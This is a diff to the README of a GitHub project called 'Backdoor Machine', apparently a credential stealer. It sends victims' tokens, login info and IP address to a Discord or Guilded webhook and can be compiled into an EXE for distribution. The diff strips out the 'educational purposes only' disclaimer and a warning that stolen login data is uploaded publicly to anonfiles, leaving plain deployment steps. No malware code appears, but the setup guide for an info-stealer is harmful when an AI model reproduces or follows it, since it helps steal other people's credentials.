@@ -1,4 +1,4 @@
-# Backdoor Machine - ❗For educational purposes only❗
+# Backdoor Machine
 ![GitHub last commit](https://img.shields.io/github/last-commit/CUPZYY/Backdoor-Machine?style=for-the-badge)
 ![GitHub repo size](https://img.shields.io/github/repo-size/CUPZYY/Backdoor-Machine?style=for-the-badge)
 ![Lines of code](https://img.shields.io/tokei/lines/github/CUPZYY/Backdoor-Machine?style=for-the-badge)
@@ -17,7 +17,7 @@ It will send a message in a webhook, with all the tokens, login info, ip and so 
    ```
 3. Make a webhook in a discord server/guilded.gg server.
 4. Copy the webhook url into webhook.txt
-5. Run the code or something. (WARNING! This should be done in a vm(Virtual Machine) because the txt file with the login info will be uploaded to anonfiles, so anyone can access the file if they somehow get the url to the file).
+5. Run the code or something.
 
 ## Compile for distribution (EXE)
 1. Install pyinstaller:
